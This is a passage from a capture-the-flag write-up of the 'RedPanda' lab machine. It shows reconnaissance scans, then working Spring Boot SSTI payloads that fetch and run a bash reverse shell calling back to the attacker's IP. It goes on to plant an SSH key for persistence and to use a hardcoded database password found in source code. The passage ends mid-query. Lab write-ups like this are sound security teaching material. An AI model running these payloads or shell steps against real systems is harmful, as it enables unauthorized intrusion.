<span class="s1">|     &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400</span>
<span class="s1">|     Request&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400</span>
<span class="s1">|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</span>
<span class="s1">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
<span class="s1">SF-Port8080-TCP:V=7.92%I=7%D=10/16%Time=634BFA16%P=aarch64-unknown-linux-g</span>
<span class="s1">SF:nu%r(GetRequest,690,&quot;HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html</span>
<span class="s1">SF:;charset=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Sun,\x2016\x20</span>
<span class="s1">SF:Oct\x202022\x2012:33:26\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE</span>
<span class="s1">SF:\x20html&gt;\n&lt;html\x20lang=\&quot;en\&quot;\x20dir=\&quot;ltr\&quot;&gt;\n\x20\x20&lt;head&gt;\n\x20\x</span>
<span class="s1">SF:20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20author=</span>
<span class="s1">SF:\&quot;wooden_k\&quot;&gt;\n\x20\x20\x20\x20&lt;!--Codepen\x20by\x20khr2003:\x20https:/</span>
<span class="s1">SF:/codepen\.io/khr2003/pen/BGZdXw\x20--&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;</span>
<span class="s1">SF:stylesheet\&quot;\x20href=\&quot;css/panda\.css\&quot;\x20type=\&quot;text/css\&quot;&gt;\n\x20\x20</span>
<span class="s1">SF:\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/main\.css\&quot;\x20type=\</span>
<span class="s1">SF:&quot;text/css\&quot;&gt;\n\x20\x20\x20\x20&lt;title&gt;Red\x20Panda\x20Search\x20\|\x20Ma</span>
<span class="s1">SF:de\x20with\x20Spring\x20Boot&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\n</span>
<span class="s1">SF:\n\x20\x20\x20\x20&lt;div\x20class=&#39;</span>pande<span class="s1">&#39;&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\</span>
<span class="s1">SF:x20class=&#39;</span>ear<span class="se">\x</span>20left<span class="s1">&#39;&gt;&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>e
SF:ar<span class="se">\x</span>20right<span class="s1">&#39;&gt;&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>whiskers<span class="se">\x</span><span class="m">2</span>
SF:0left<span class="s1">&#39;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x2</span>
<span class="s1">SF:0\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x2</span>
<span class="s1">SF:0\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20&lt;/div&gt;\n\x20\x2</span>
<span class="s1">SF:0\x20\x20\x20\x20&lt;div\x20class=&#39;</span>whiskers<span class="se">\x</span>20right<span class="s1">&#39;&gt;\n\x20\x20\x20\x20\x</span>
<span class="s1">SF:20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/sp</span>
<span class="s1">SF:an&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x2</span>
<span class="s1">SF:0\x20&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>face<span class="s1">&#39;&gt;\n\x20\x20\x2</span>
<span class="s1">SF:0\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>eye<span class="s2">&quot;)%r(HTTPOptions,75,&quot;</span>HTTP/1<span class="se">\.</span><span class="m">1</span><span class="se">\x</span>
SF:20200<span class="se">\x</span><span class="m">20</span><span class="se">\r\n</span>Allow:<span class="se">\x</span>20GET,HEAD,OPTIONS<span class="se">\r\n</span>Content-Length:<span class="se">\x</span><span class="m">200</span><span class="se">\r\n</span>Date
SF::<span class="se">\x</span>20Sun,<span class="se">\x</span><span class="m">2016</span><span class="se">\x</span>20Oct<span class="se">\x</span><span class="m">202022</span><span class="se">\x</span><span class="m">2012</span>:33:26<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\x</span>20clo
SF:se<span class="se">\r\n\r\n</span><span class="s2">&quot;)%r(RTSPRequest,24E,&quot;</span>HTTP/1<span class="se">\.</span><span class="m">1</span><span class="se">\x</span><span class="m">20400</span><span class="se">\x</span><span class="m">20</span><span class="se">\r\n</span>Content-Type:<span class="se">\x</span>
SF:20text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="se">\r\n</span>Content-Language:<span class="se">\x</span>20en<span class="se">\r\n</span>Content-Length:
SF:<span class="se">\x</span><span class="m">20435</span><span class="se">\r\n</span>Date:<span class="se">\x</span>20Sun,<span class="se">\x</span><span class="m">2016</span><span class="se">\x</span>20Oct<span class="se">\x</span><span class="m">202022</span><span class="se">\x</span><span class="m">2012</span>:33:26<span class="se">\x</span>20GMT<span class="se">\r\n</span>Con
SF:nection:<span class="se">\x</span>20close<span class="se">\r\n\r\n</span>&lt;!doctype<span class="se">\x</span>20html&gt;&lt;html<span class="se">\x</span>20lang<span class="o">=</span><span class="se">\&quot;</span>en<span class="se">\&quot;</span>&gt;&lt;head&gt;&lt;
SF:title&gt;HTTP<span class="se">\x</span>20Status<span class="se">\x</span><span class="m">20400</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span>e2<span class="se">\x</span><span class="m">80</span><span class="se">\x</span><span class="m">93</span><span class="se">\x</span>20Bad<span class="se">\x</span>20Request&lt;/title&gt;&lt;s
SF:tyle<span class="se">\x</span>20type<span class="o">=</span><span class="se">\&quot;</span>text/css<span class="se">\&quot;</span>&gt;body<span class="se">\x</span><span class="m">20</span><span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>
SF:<span class="o">}</span><span class="se">\x</span>20h1,<span class="se">\x</span>20h2,<span class="se">\x</span>20h3,<span class="se">\x</span>20b<span class="se">\x</span><span class="m">20</span><span class="o">{</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span><span class="o">}</span><span class="se">\</span>
SF:x20h1<span class="se">\x</span><span class="m">20</span><span class="o">{</span>font-size:22px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20h2<span class="se">\x</span><span class="m">20</span><span class="o">{</span>font-size:16px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20h3<span class="se">\x</span><span class="m">20</span><span class="o">{</span>font-si
SF:ze:14px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20p<span class="se">\x</span><span class="m">20</span><span class="o">{</span>font-size:12px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20a<span class="se">\x</span><span class="m">20</span><span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span><span class="se">\x</span><span class="m">20</span><span class="se">\.</span>line<span class="se">\x</span><span class="m">2</span>
SF:0<span class="o">{</span>height:1px<span class="p">;</span>background-color:#525D76<span class="p">;</span>border:none<span class="p">;</span><span class="o">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body
SF:&gt;&lt;h1&gt;HTTP<span class="se">\x</span>20Status<span class="se">\x</span><span class="m">20400</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span>e2<span class="se">\x</span><span class="m">80</span><span class="se">\x</span><span class="m">93</span><span class="se">\x</span>20Bad<span class="se">\x</span>20Request&lt;/h1&gt;&lt;/body
SF:&gt;&lt;/html&gt;<span class="s2">&quot;);</span>
<span class="s2">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>

<span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span class="s2">Nmap done: 1 IP address (1 host up) scanned in 15.48 seconds</span>
<span class="s2">zsh: segmentation fault  nmap -sC -sV panda.htb -oN nmap.initial</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dirsearch<span class="w"> </span>-u<span class="w"> </span>http://panda.htb:8080

<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.2
<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span>

Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">10927</span>

Output<span class="w"> </span>File:<span class="w"> </span>/home/blnkn/.dirsearch/reports/panda.htb-8080/_22-10-16_13-34-45.txt

Error<span class="w"> </span>Log:<span class="w"> </span>/home/blnkn/.dirsearch/logs/errors-22-10-16_13-34-45.log

Target:<span class="w"> </span>http://panda.htb:8080/

<span class="o">[</span><span class="m">13</span>:34:45<span class="o">]</span><span class="w"> </span>Starting:
<span class="o">[</span><span class="m">13</span>:34:49<span class="o">]</span><span class="w"> </span><span class="m">400</span><span class="w"> </span>-<span class="w">  </span>435B<span class="w">  </span>-<span class="w"> </span>/<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\e</span>tc<span class="se">\p</span>asswd
<span class="o">[</span><span class="m">13</span>:34:50<span class="o">]</span><span class="w"> </span><span class="m">400</span><span class="w"> </span>-<span class="w">  </span>435B<span class="w">  </span>-<span class="w"> </span>/a%5c.aspx
<span class="o">[</span><span class="m">13</span>:34:57<span class="o">]</span><span class="w"> </span><span class="m">500</span><span class="w"> </span>-<span class="w">   </span>86B<span class="w">  </span>-<span class="w"> </span>/error/
<span class="o">[</span><span class="m">13</span>:34:57<span class="o">]</span><span class="w"> </span><span class="m">500</span><span class="w"> </span>-<span class="w">   </span>86B<span class="w">  </span>-<span class="w"> </span>/error
<span class="o">[</span><span class="m">13</span>:35:10<span class="o">]</span><span class="w"> </span><span class="m">405</span><span class="w"> </span>-<span class="w">  </span>117B<span class="w">  </span>-<span class="w"> </span>/search
<span class="o">[</span><span class="m">13</span>:35:12<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>987B<span class="w">  </span>-<span class="w"> </span>/stats
<span class="o">[</span><span class="m">13</span>:35:12<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>987B<span class="w">  </span>-<span class="w"> </span>/stats/

Task<span class="w"> </span>Completed
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>whatweb<span class="w"> </span>http://panda.htb:8080
http://panda.htb:8080<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="w"> </span>OK<span class="o">]</span><span class="w"> </span>Content-Language<span class="o">[</span>en-US<span class="o">]</span>,<span class="w"> </span>Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>,<span class="w"> </span>HTML5,<span class="w"> </span>IP<span class="o">[</span><span class="m">10</span>.10.11.170<span class="o">]</span>,<span class="w"> </span>Title<span class="o">[</span>Red<span class="w"> </span>Panda<span class="w"> </span>Search<span class="w"> </span><span class="p">|</span><span class="w"> </span>Made<span class="w"> </span>with<span class="w"> </span>Spring<span class="w"> </span>Boot<span class="o">]</span>
</pre></div>
</div>
</section>
<section id="java-springboot-ssti">
<h2>Java SpringBoot - SSTI<a class="headerlink" href="#java-springboot-ssti" title="Permalink to this heading">#</a></h2>
<p>We know it’s running springboot, so it’s some kind of java app, and we control the search field as an input.<br />
<a class="reference external" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java---basic-injection">PayloadsAllTheThings - basic SSTI</a></p>
<p>when attempting a <code class="docutils literal notranslate"><span class="pre">${7*7}</span></code> we get an error, saying that some of the characters we used are banned, cool, that’s something<br />
<img alt="banned.png" src="../../../../_images/banned.png" /></p>
<p>trying chars one by one, the one that’s banned is the dollar sign, but the solution is also in payloadallthethings:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Multiple variable expressions can be used, if ${...} doesn&#39;t work try #{...}, *{...}, @{...} or ~{...}.
</pre></div>
</div>
<p><code class="docutils literal notranslate"><span class="pre">*</span></code>&amp;<code class="docutils literal notranslate"><span class="pre">#</span></code>&amp;<code class="docutils literal notranslate"><span class="pre">&#64;</span></code> work, but <code class="docutils literal notranslate"><span class="pre">~</span></code> is also banned<br />
<img alt="at.png" src="../../../../_images/at.png" /></p>
<p>Using this tool to generate java ssti payloads <a class="reference external" href="https://github.com/VikasVarshney/ssti-payload">https://github.com/VikasVarshney/ssti-payload</a></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>ssti-payload.py
<span class="nv">Command</span><span class="w"> </span><span class="o">==</span>&gt;<span class="w"> </span>id
<span class="si">${</span><span class="nv">T</span><span class="p">(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())</span><span class="si">}</span>
</pre></div>
</div>
<p><img alt="woodenk.png" src="../../../../_images/woodenk.png" /></p>
<p>This is running as woodenk, I tried to pull woodenk’s ssh key but he doesn’t seem to have one</p>
<p>Making a staged reverse shell</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.81/4242 0&gt;&amp;1&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>sh.sh
cat<span class="w"> </span>sh.sh
bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.10.14.81/4242<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
</pre></div>
</div>
<p>Dropping it on the filesystem</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">Command</span><span class="w"> </span><span class="o">==</span>&gt;<span class="w"> </span>curl<span class="w"> </span>-s<span class="w"> </span>http://10.10.14.81:8000/sh.sh<span class="w"> </span>-O
<span class="si">${</span><span class="nv">T</span><span class="p">(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(58)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(58)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(79))).getInputStream())</span><span class="si">}</span>
</pre></div>
</div>
<p>Executing it</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">Command</span><span class="w"> </span><span class="o">==</span>&gt;<span class="w"> </span>bash<span class="w"> </span>./sh.sh
<span class="si">${</span><span class="nv">T</span><span class="p">(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104))).getInputStream())</span><span class="si">}</span>
</pre></div>
</div>
<p>And we got a shell</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>woodenk@redpanda:/tmp/hsperfdata_woodenk$<span class="w"> </span><span class="nb">pwd</span>
<span class="nb">pwd</span>
/tmp/hsperfdata_woodenk
woodenk@redpanda:/tmp/hsperfdata_woodenk$<span class="w"> </span>id
id
<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>woodenk<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>logs<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>logs<span class="o">)</span>,1000<span class="o">(</span>woodenk<span class="o">)</span>
woodenk@redpanda:/tmp/hsperfdata_woodenk$<span class="w"> </span><span class="nb">cd</span>
<span class="nb">cd</span>
woodenk@redpanda:~$<span class="w"> </span>wc<span class="w"> </span>-c<span class="w"> </span>user.txt
wc<span class="w"> </span>-c<span class="w"> </span>user.txt
<span class="m">33</span><span class="w"> </span>user.txt
</pre></div>
</div>
</section>
<section id="looking-around">
<h2>Looking around<a class="headerlink" href="#looking-around" title="Permalink to this heading">#</a></h2>
<p>First of all I’ll drop a public key to get a real shell</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>woodenk@redpanda:~$ mkdir .ssh
mkdir .ssh
woodenk@redpanda:~$ cd .ssh
cd .ssh
woodenk@redpanda:~/.ssh$ echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1aV0794+n5PgwXby/FDlO8tD0I0feVtY2zL3/TLjTKP/HfHZcmrYziPvnTixKaCp86me/S8CkBz4iHYe0sx4RMX8PC2Qf/UFg5vBWkZM4NeoGmnd5ctFFWGX9N6FyJJIFvL6Ya/Y+DYJTmQSi6zCw9coNX4zFkXRo4iryNPkTCOm77rq4O4mu+zH1XZOcwDBm+75/K846QJHYlFHSaFh9Ncg4P5YXzFPEzdz0/sDCuxa4Y0f1oMrtMya0VaEogF63IjriUrgwPo7vZgpA3exkF0V6xYHOCYrqzzZskiPvt/7T/RaDXJA6zTxgg168TWBMYhpKeX4pNgAR/URD2fpISIpN/EgHu5pSTk2GyokSikwHffyo14Wieco9Y+qi7fguP68ngbQP7jmZXxaCBd7PQaHkHR5CN01XdGIDABvDpQppfF9jtUafY46wfzy2OhmsPaNWGTiIf07rA5mB9Yes2D+2//OoQIzSgRBXHl9H99HZ+Seb9nQGnbRekxF2msk=&#39; &gt; authorized_keys
&lt;gRBXHl9H99HZ+Seb9nQGnbRekxF2msk=&#39; &gt; authorized_keys
woodenk@redpanda:~/.ssh$ chmod 400 authorized_keys
chmod 400 authorized_keys
woodenk@redpanda:~/.ssh$ ls -la
ls -la
total 12
drwxrwxr-x 2 woodenk logs    4096 Oct 16 13:14 .
drwxr-xr-x 7 woodenk woodenk 4096 Oct 16 13:14 ..
-r-------- 1 woodenk logs     553 Oct 16 13:14 authorized_keys
woodenk@redpanda:~$ chown -R woodenk:woodenk .
</pre></div>
</div>
<p>then start to look around</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>netstat<span class="w"> </span>-tulpen
<span class="o">(</span>Not<span class="w"> </span>all<span class="w"> </span>processes<span class="w"> </span>could<span class="w"> </span>be<span class="w"> </span>identified,<span class="w"> </span>non-owned<span class="w"> </span>process<span class="w"> </span>info
<span class="w"> </span>will<span class="w"> </span>not<span class="w"> </span>be<span class="w"> </span>shown,<span class="w"> </span>you<span class="w"> </span>would<span class="w"> </span>have<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>root<span class="w"> </span>to<span class="w"> </span>see<span class="w"> </span>it<span class="w"> </span>all.<span class="o">)</span>
Active<span class="w"> </span>Internet<span class="w"> </span>connections<span class="w"> </span><span class="o">(</span>only<span class="w"> </span>servers<span class="o">)</span>
Proto<span class="w"> </span>Recv-Q<span class="w"> </span>Send-Q<span class="w"> </span>Local<span class="w"> </span>Address<span class="w">           </span>Foreign<span class="w"> </span>Address<span class="w">         </span>State<span class="w">       </span>User<span class="w">       </span>Inode<span class="w">      </span>PID/Program<span class="w"> </span>name
tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.53:53<span class="w">           </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">101</span><span class="w">        </span><span class="m">22393</span><span class="w">      </span>-<span class="w"> </span>
tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:22<span class="w">              </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">22484</span><span class="w">      </span>-<span class="w"> </span>
tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:33060<span class="w">         </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">113</span><span class="w">        </span><span class="m">24913</span><span class="w">      </span>-<span class="w"> </span>
tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:3306<span class="w">          </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">113</span><span class="w">        </span><span class="m">24916</span><span class="w">      </span>-<span class="w"> </span>
tcp6<span class="w">       </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>:::8080<span class="w">                 </span>:::*<span class="w">                    </span>LISTEN<span class="w">      </span><span class="m">1000</span><span class="w">       </span><span class="m">23855</span><span class="w">      </span>-<span class="w"> </span>
tcp6<span class="w">       </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>:::22<span class="w">                   </span>:::*<span class="w">                    </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">22495</span><span class="w">      </span>-<span class="w"> </span>
udp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.53:53<span class="w">           </span><span class="m">0</span>.0.0.0:*<span class="w">                           </span><span class="m">101</span><span class="w">        </span><span class="m">22392</span><span class="w">      </span>-<span class="w"> </span>
udp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:68<span class="w">              </span><span class="m">0</span>.0.0.0:*<span class="w">                           </span><span class="m">0</span><span class="w">          </span><span class="m">20211</span><span class="w">      </span>-<span class="w"> </span>
</pre></div>
</div>
<p>can we connect to the mysql db?</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>-rI<span class="w"> </span>jdbc<span class="w"> </span>./*
./src/main/java/com/panda_search/htb/panda_search/MainController.java:<span class="w">            </span>Class.forName<span class="o">(</span><span class="s2">&quot;com.mysql.cj.jdbc.Driver&quot;</span><span class="o">)</span><span class="p">;</span>
./src/main/java/com/panda_search/htb/panda_search/MainController.java:<span class="w">            </span><span class="nv">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>DriverManager.getConnection<span class="o">(</span><span class="s2">&quot;jdbc:mysql://localhost:3306/red_panda&quot;</span>,<span class="w"> </span><span class="s2">&quot;woodenk&quot;</span>,<span class="w"> </span><span class="s2">&quot;RedPandazRule&quot;</span><span class="o">)</span><span class="p">;</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mysql<span class="w"> </span>-D<span class="w"> </span>red_panda<span class="w"> </span>-u<span class="w"> </span>woodenk<span class="w"> </span>-p<span class="w">  </span>
</pre></div>
</div>
<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">databases</span><span class="p">;</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span><span class="w"> </span><span class="k">Database</span><span class="w">           </span><span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span><span class="w"> </span><span class="n">information_schema</span><span class="w"> </span><span class="o">|</span>
<span class="o">|</span><span class="w"> </span><span class="n">red_panda</span><span class="w">          </span><span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="mi">2</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">red_panda</span><span class="p">;</span>
<span class="k">Database</span><span class="w"> </span><span class="n">changed</span>
<span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">tables</span><span class="p">;</span>
<span class="o">+</span><span class="c1">---------------------+</span>
<span class="o">|</span><span class="w"> </span><span class="n">Tables_in_red_panda</span><span class="w"> </span><span class="o">|</span>
<span class="o">+</span><span class="c1">---------------------+</span>
<span class="o">|</span><span class="w"> </span><span class="n">pandas</span><span class="w">              </span><span class="o">|</span>
<span class="o">+</span><span class="c1">---------------------+</span>
<span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">pandas</span><span class="p">;</span>
<span class="o">+</span><span class="c1">----------+------------------------------------------------------------------------------------+------------------+---------+</span>
<span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">bio</span><span class="w">                                                                                </span><span class="o">|</span><span class="w"> </span><span class="n">imgloc</span><span class="w">           </span><span class="o">|</span><span class="w"> </span><span class="n">author</span><span class="w">  </span><span class="o">|</span>
<span class="o">+</span><span class="c1">----------+------------------------------------------------------------------------------------+------------------+---------+</span>
<span class="o">|</span><span class="w"> </span><span class="n">Smooch</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">Smooch</span><span class="w"> </span><span class="n">likes</span><span class="w"> </span><span class="n">giving</span><span class="w"> </span><span class="n">kisses</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">hugs</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">everyone</span><span class="o">!</span><span class="w">                                   </span><span class="o">|</span><span class="w"> </span><span class="n">img</span><span class="o">/</span><span class="n">smooch</span><span class="p">.</span><span class="n">jpg</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">woodenk</span><span class="w"> </span><span class="o">|</span>
